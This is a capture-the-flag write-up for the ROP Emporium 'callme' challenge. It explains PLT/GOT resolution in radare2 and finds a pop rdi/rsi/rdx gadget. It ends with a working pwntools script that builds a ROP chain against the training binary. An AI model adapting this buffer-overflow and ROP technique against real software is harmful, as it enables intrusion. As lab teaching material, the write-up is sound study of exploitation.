# callme

Lets download and unzip the [challenge file](https://ropemporium.com/binary/callme.zip) and run it:

```sh
$ ./callme
callme by ROP Emporium
64bits

Hope you read the instructions...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    18329 segmentation fault (core dumped)  ./callme
```

Let's take a look at the `pwnme` function again:

```asm
$ radare2 -A split
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- I script in C, because I can.

[0x004018a0]> pdf @ sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var char *s @ rbp-0x20
|           ; CALL XREF from sym.main (0x4019ef)
|           0x00401a05      55             push rbp
|           0x00401a06      4889e5         mov rbp, rsp
|           0x00401a09      4883ec20       sub rsp, 0x20
|           0x00401a0d      488d45e0       lea rax, [s]
|           0x00401a11      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x00401a16      be00000000     mov esi, 0                  ; int c
|           0x00401a1b      4889c7         mov rdi, rax                ; void *s
|           0x00401a1e      e8fdfdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00401a23      bf701b4000     mov edi, str.Hope_you_read_the_instructions... ; 0x401b70 ; "Hope you read the instructions..." ; const char *s
|           0x00401a28      e8c3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00401a2d      bf921b4000     mov edi, 0x401b92           ; const char *format
|           0x00401a32      b800000000     mov eax, 0
|           0x00401a37      e8c4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00401a3c      488b154d0620.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0 ; FILE *stream
|           0x00401a43      488d45e0       lea rax, [s]
|           0x00401a47      be00010000     mov esi, 0x100              ; 256 ; int size
|           0x00401a4c      4889c7         mov rdi, rax                ; char *s
|           0x00401a4f      e8ecfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00401a54      90             nop
|           0x00401a55      c9             leave
\           0x00401a56      c3             ret
```

And there's a `usefulFunction` for us to look at again:

```asm
[0x004018a0]> pdf @ sym.usefulFunction
/ (fcn) sym.usefulFunction 74
|   sym.usefulFunction ();
|           0x00401a57      55             push rbp
|           0x00401a58      4889e5         mov rbp, rsp
|           0x00401a5b      ba06000000     mov edx, 6
|           0x00401a60      be05000000     mov esi, 5
|           0x00401a65      bf04000000     mov edi, 4
|           0x00401a6a      e8a1fdffff     call sym.imp.callme_three
|           0x00401a6f      ba06000000     mov edx, 6
|           0x00401a74      be05000000     mov esi, 5
|           0x00401a79      bf04000000     mov edi, 4
|           0x00401a7e      e8edfdffff     call sym.imp.callme_two
|           0x00401a83      ba06000000     mov edx, 6
|           0x00401a88      be05000000     mov esi, 5
|           0x00401a8d      bf04000000     mov edi, 4
|           0x00401a92      e8b9fdffff     call sym.imp.callme_one
|           0x00401a97      bf01000000     mov edi, 1                  ; int status
\           0x00401a9c      e8dffdffff     call sym.imp.exit           ; void exit(int status)
```

The challenge has a useful bit of explaining text:

> Important:
> To dispose of the need for any RE we'll tell you the following:
> You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag. The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments. Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and the encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order.

The text refers to the PLT, or the "Procedural Linkage Table". Appendix A in the [Guide](https://ropemporium.com/guide.html) does a pretty good job describing it and is definitely worth reading. 

It's worth walking through PLT resolution in order to illustrate its working. In order to see it in action, we want to be able to force the executable to jump to one of the `callme` functions.

In order to do that, we can craft a payload and then tell radare to use the payload when running. To craft the payload we can use a small python script:
```python

from pwn import *

payload = "A" * 40

useful_function = p64(0x00401a57)

payload += useful_function

open('payload', 'w').write(payload)
```

And then we can run radare with the payload as its stdin.


```asm
$ radare2 -A -Rstdin=payload -d callme
Process with PID 25272 started...
= attach 25272 25272
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[TOFIX: afta can't run in debugger mode.ions (afta)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
= attach 25272 25272
25272
 -- You crackme up!

[0x7fd2bcd5bea0]> dcu sym.usefulFunction
Continue until 0x00401a05 using 1 bpsize
callme by ROP Emporium
64bits

> hit breakpoint at: 401a57
```

We can look at the contents of `callme_three` now:

```asm
[0x00401a57]> pd @ sym.imp.callme_three
/ (fcn) sym.imp.callme_three 6
|   sym.imp.callme_three ();
| :::::::   ; CALL XREF from sym.usefulFunction (0x401a6a)
\ :::::::   0x00401810      ff2512082000   jmp qword reloc.callme_three ; [0x602028:8]=0x401816
  :::::::   0x00401816      6802000000     push 2                      ; 2
  ========< 0x0040181b      e9c0ffffff     jmp 0x4017e0
```

If we look at the address `0x00401810`, we can see that it's in the PLT section:

```
[0x00401a57]> iS
[Sections]
00 0x00000000     0 0x00000000     0 ---- 
01 0x00001238    28 0x00401238    28 -r-- .interp
02 0x00001254    32 0x00401254    32 -r-- .note.ABI_tag
03 0x00001274    36 0x00401274    36 -r-- .note.gnu.build_id
04 0x00001298    68 0x00401298    68 -r-- .gnu.hash
05 0x000012e0   552 0x004012e0   552 -r-- .dynsym
06 0x00001508   275 0x00401508   275 -r-- .dynstr
07 0x0000161c    46 0x0040161c    46 -r-- .gnu.version
08 0x00001650    32 0x00401650    32 -r-- .gnu.version_r
09 0x00001670    96 0x00401670    96 -r-- .rela.dyn
10 0x000016d0   240 0x004016d0   240 -r-- .rela.plt
11 0x000017c0    26 0x004017c0    26 -r-x .init
12 0x000017e0   176 0x004017e0   176 -r-x .plt
13 0x00001890     8 0x00401890     8 -r-x .plt.got
14 0x000018a0   658 0x004018a0   658 -r-x .text
15 0x00001b34     9 0x00401b34     9 -r-x .fini
16 0x00001b40    85 0x00401b40    85 -r-- .rodata
17 0x00001b98    68 0x00401b98    68 -r-- .eh_frame_hdr
18 0x00001be0   308 0x00401be0   308 -r-- .eh_frame
19 0x00001df0     8 0x00601df0     8 -rw- .init_array
20 0x00001df8     8 0x00601df8     8 -rw- .fini_array
21 0x00001e00     8 0x00601e00     8 -rw- .jcr
22 0x00001e08   496 0x00601e08   496 -rw- .dynamic
23 0x00001ff8     8 0x00601ff8     8 -rw- .got
24 0x00002000   104 0x00602000   104 -rw- .got.plt
25 0x00002068    16 0x00602068    16 -rw- .data
26 0x00002078     0 0x00602080    48 -rw- .bss
27 0x00002078    52 0x00000000    52 ---- .comment
28 0x00002b63   268 0x00000000   268 ---- .shstrtab
29 0x000020b0  1968 0x00000000  1968 ---- .symtab
30 0x00002860   771 0x00000000   771 ---- .strtab
```

There's another way to explore the location as well. We can use `V` to enter visual mode:

```asm
[0x004017da]> V

/ (fcn) sym.usefulFunction 74                                                                                                                                                                                       
|   sym.usefulFunction ();                                                                                                                                                                                          
|           0x00401a57      55             push rbp                                                                                                                                                                 
|           0x00401a58      4889e5         mov rbp, rsp                                                                                                                                                             
|           0x00401a5b      ba06000000     mov edx, 6                                                                                                                                                               
|           0x00401a60      be05000000     mov esi, 5                                                                                                                                                               
|           0x00401a65      bf04000000     mov edi, 4                                                                                                                                                               
|           0x00401a6a      e8a1fdffff     call sym.imp.callme_three   ;[1]                                                                                                                                         
|           0x00401a6f      ba06000000     mov edx, 6                                                                                                                                                               
|           0x00401a74      be05000000     mov esi, 5                                                                                                                                                               
|           0x00401a79      bf04000000     mov edi, 4                                                                                                                                                               
|           0x00401a7e      e8edfdffff     call sym.imp.callme_two     ;[2]                                                                                                                                         
|           0x00401a83      ba06000000     mov edx, 6                                                                                                                                                               
|           0x00401a88      be05000000     mov esi, 5                                                                                                                                                               
|           0x00401a8d      bf04000000     mov edi, 4                                                                                                                                                               
|           0x00401a92      e8b9fdffff     call sym.imp.callme_one     ;[3]                                                                                                                                         
|           0x00401a97      bf01000000     mov edi, 1                                                                                                                                                               
\           0x00401a9c      e8dffdffff     call sym.imp.exit           ;[4] ; void exit(int status)                                                                                                                 
            0x00401aa1      662e0f1f8400.  nop word cs:[rax + rax]                                                                                                                                                  
            0x00401aab      0f1f440000     nop dword [rax + rax]                                                                                                                                                    
            ;-- usefulGadgets:                                                                                                                                                                                      
            0x00401ab0      5f             pop rdi                                                                                                                                                                  
            0x00401ab1      5e             pop rsi                                                                                                                                                                  
            0x00401ab2      5a             pop rdx                                                                                                                                                                  
            0x00401ab3      c3             ret                                                                                                                                                                      
            0x00401ab4      662e0f1f8400.  nop word cs:[rax + rax]                                                                                                                                                  
            0x00401abe      6690           nop                                                                                                                                                                      
```

In order to get to the disassembly, you have to press 'p' a few times.

Each of the functions have a number in square brackets at the end of them. In order to jump to that function, press the corresponding number key. Pressing '1' will take you to the `callme_three` function. From there, you can use vim keys to look around. If you scroll up a few lines you can see the start of the plt section:

```asm

            ;-- section..plt:                                                                                                                                                                                       
  .......-> 0x004017e0      ff3522082000   push qword [0x00602008]     ; [12] -r-x section size 176 named .plt                                                                                                      
  :::::::   0x004017e6      ff2524082000   jmp qword [0x00602010]      ; [0x602010:8]=0x7f75d5706bf0                                                                                                                
  :::::::   0x004017ec      0f1f4000       nop dword [rax]                                                                                                                                                          
/ (fcn) sym.imp.puts 6                                                                                                                                                                                              
|   sym.imp.puts (const char *s);                                                                                                                                                                                   
| :::::::   ; CALL XREFS from sym.main (0x4019db, 0x4019e5, 0x4019f9)                                                                                                                                               
| :::::::   ; CALL XREF from sym.pwnme (0x401a28)                                                                                                                                                                   
\ :::::::   0x004017f0      ff2522082000   jmp qword reloc.puts        ; [0x602018:8]=0x7f75d5185460 ; "`T\x18\xd5u\x7f"                                                                                            
  :::::::   0x004017f6      6800000000     push 0                                                                                                                                                                   
  ========< 0x004017fb      e9e0ffffff     jmp 0x4017e0                ;[2]                                                                                                                                         
/ (fcn) sym.imp.printf 6                                                                                                                                                                                            
|   sym.imp.printf (const char *format);                                                                                                                                                                            
| :::::::   ; CALL XREF from sym.pwnme (0x401a37)                                                                                                                                                                   
\ :::::::   0x00401800      ff251a082000   jmp qword reloc.printf      ; [0x602020:8]=0x7f75d5169d90                                                                                                                
  :::::::   0x00401806      6801000000     push 1                      ; 1                                                                                                                                          
  ========< 0x0040180b      e9d0ffffff     jmp 0x4017e0                ;[2]                                                                                                                                         
/ (fcn) sym.imp.callme_three 6                                                                                                                                                                                      
|   sym.imp.callme_three ();                                                                                                                                                                                        
| :::::::   ; CALL XREF from sym.usefulFunction (0x401a6a)                                                                                                                                                          
\ :::::::   0x00401810      ff2512082000   jmp qword reloc.callme_three    ; [0x602028:8]=0x401816                                                                                                                  
  :::::::   0x00401816      6802000000     push 2                      ; 2                                                                                                                                          
  ========< 0x0040181b      e9c0ffffff     jmp 0x4017e0                ;[2]                                                                                                                                         
```

Now we can continue until the program jumps into the plt:

```asm
[0x004017da]> dcu sym.imp.callme_three
[0x00401810]> pd
| :::::::   ;-- rip:
/ (fcn) sym.imp.callme_three 6
|   sym.imp.callme_three ();
| :::::::   ; CALL XREF from sym.usefulFunction (0x401a6a)
\ :::::::   0x00401810      ff2512082000   jmp qword reloc.callme_three ; [0x602028:8]=0x401816
  :::::::   0x00401816      6802000000     push 2                      ; 2
  ========< 0x0040181b      e9c0ffffff     jmp 0x4017e0
```

The code in this stub will jump to the address stored at `reloc.callme_three`. Looking at that value now:

```asm
[0x00401800]> pd @ reloc.callme_three
            ;-- reloc.callme_three:
            ; DATA XREF from sym.imp.callme_three (0x401810)
            0x00602028      .qword 0x0000000000401816
```

That address is just the next line in the plt section. Stepping through a couple times, we can see that's where we end up.
The next line pushes the value '2' to the stack, and then makes a `jmp 0x4017e0` call. Let's look at the contents of that address:

```asm
[0x004017e0]> pd @ 0x4017e0
            ;-- section..plt:
            ;-- rip:
  .......-> 0x004017e0      ff3522082000   push qword [0x00602008]     ; [12] -r-x section size 176 named .plt
  :::::::   0x004017e6      ff2524082000   jmp qword [0x00602010]      ; [0x602010:8]=0x7f75d5706bf0
  :::::::   0x004017ec      0f1f4000       nop dword [rax]
```

The `0x4017e0` address is the top of the plt. This will then jump to the address stored at `0x00602010`. That address is in the GOT, or the Global Offset Table:

```asm
[0x004017e0]> px @ 0x00602010
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00602010  f06b 70d5 757f 0000 6054 18d5 757f 0000  .kp.u...`T..u...
```

So the `jmp` is going to `0x7f75d5706bf0`. Which if we look carefully enough at the previous bit of output, we can see that radare has already done that calculation for us. That address is the dynamic resolver, which will patch the .got.plt entry and then jump to the function.

Let's step to the address after the `callme_three` function and then we can examine the .plt entry:

```asm
[0x004017e0]> dcu 0x00401a6f

Continue until 0x00401a6f using 1 bpsize
callme by ROP Emporium
64bits

Hope you read the instructions...
> Incorrect parameters

[0x7f9170f21fd8]> pd @ sym.imp.callme_three
/ (fcn) sym.imp.callme_three 6
|   sym.imp.callme_three ();
| :::::::   ; CALL XREF from sym.usefulFunction (0x401a6a)
\ :::::::   0x00401810      ff2512082000   jmp qword reloc.callme_three ; [0x602028:8]=0x7f9171229aaa
  :::::::   0x00401816      6802000000     push 2                      ; 2
  ========< 0x0040181b      e9c0ffffff     jmp 0x4017e0
```

The plt still points to the got, but the value in the got now points to the actual `callme_three` function:

```asm
0x7f9170f21fd8]> pd @ 0x7f9171229aaa
            0x7f9171229aaa      55             push rbp
            0x7f9171229aab      4889e5         mov rbp, rsp
            0x7f9171229aae      4883ec20       sub rsp, 0x20
            0x7f9171229ab2      897dec         mov dword [rbp - 0x14], edi
            0x7f9171229ab5      8975e8         mov dword [rbp - 0x18], esi
            0x7f9171229ab8      8955e4         mov dword [rbp - 0x1c], edx
            0x7f9171229abb      837dec01       cmp dword [rbp - 0x14], 1 ; rdi ; [0x1:4]=-1
        ,=< 0x7f9171229abf      0f85c5000000   jne 0x7f9171229b8a
        |   0x7f9171229ac5      837de802       cmp dword [rbp - 0x18], 2 ; [0x2:4]=-1 ; 2
       ,==< 0x7f9171229ac9      0f85bb000000   jne 0x7f9171229b8a
       ||   0x7f9171229acf      837de403       cmp dword [rbp - 0x1c], 3 ; [0x3:4]=-1 ; 3
      ,===< 0x7f9171229ad3      0f85b1000000   jne 0x7f9171229b8a
      |||   0x7f9171229ad9      48c745f80000.  mov qword [rbp - 8], 0
      |||   0x7f9171229ae1      488d35c80000.  lea rsi, [0x7f9171229bb0] ; "r"
      |||   0x7f9171229ae8      488d3d4b0100.  lea rdi, [0x7f9171229c3a] ; "key2.dat"
      |||   0x7f9171229aef      e8ccfcffff     call 0x7f91712297c0
      |||   0x7f9171229af4      488945f8       mov qword [rbp - 8], rax
      |||   0x7f9171229af8      48837df800     cmp qword [rbp - 8], 0
     ,====< 0x7f9171229afd      7516           jne 0x7f9171229b15
     ||||   0x7f9171229aff      488d3d3d0100.  lea rdi, [0x7f9171229c43] ; "Failed to open key2.dat"
     ||||   0x7f9171229b06      e855fcffff     call 0x7f9171229760
     ||||   0x7f9171229b0b      bf01000000     mov edi, 1
     ||||   0x7f9171229b10      e8bbfcffff     call 0x7f91712297d0

... (A BUNCH MORE LINES FROM THIS FUNCTION SKIPPED OVER) ...

```

So now that we have a sense of how plt resolution works, we can use it to call the proper functions in the correct order with the correct arguments.

In order to get the arguments to the functions we need to look for an appropriate ROP gadget.
The first argument is `rdi`, the second argument is `rsi`, and the third argument is `rdx`. So let's look for a `pop rdx` gadget:

```asm
[0x00401a05]> /R pop rdx
  0x00401aab         0f1f440000  nop dword [rax + rax]
  0x00401ab0                 5f  pop rdi
  0x00401ab1                 5e  pop rsi
  0x00401ab2                 5a  pop rdx
  0x00401ab3                 c3  ret

  0x00401aad             440000  add byte [rax], r8b
  0x00401ab0                 5f  pop rdi
  0x00401ab1                 5e  pop rsi
  0x00401ab2                 5a  pop rdx
  0x00401ab3                 c3  ret

  0x00401aae               0000  add byte [rax], al
  0x00401ab0                 5f  pop rdi
  0x00401ab1                 5e  pop rsi
  0x00401ab2                 5a  pop rdx
  0x00401ab3                 c3  ret

  0x00401aaf             005f5e  add byte [rdi + 0x5e], bl
  0x00401ab2                 5a  pop rdx
  0x00401ab3                 c3  ret
```

So `0x00401ab0` is the address of a `pop rdi; pop rsi; pop rdx; ret` gadget. Now all we have to do is add some padding, put the plt addresses of the appropriate functions in the right order, add the argument values, and then throw in the rop gadget address:

```python
from pwn import *

prog = process("./callme")

payload = "A" * 40

callme_one_plt = p64(0x00401850)
callme_two_plt = p64(0x00401870)
callme_three_plt = p64(0x00401810)

# pop rdi
# pop rsi
# pop rdx
pop_args = p64(0x00401ab0)

one = p64(1)
two = p64(2)
three = p64(3)

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_one_plt

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_two_plt

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_three_plt

open('payload', 'w').write(payload)

print prog.recvuntil(">")

prog.clean()

prog.sendline(payload)

print prog.clean()
```

Running our exploit:
```sh
$ python exploit.py
[+] Starting local process './callme': pid 7990
callme by ROP Emporium
64bits

Hope you read the instructions...
>
[*] Process './callme' stopped with exit code 0 (pid 7990)
ROPE{a_placeholder_32byte_flag!}
```

And there's our flag! 😎
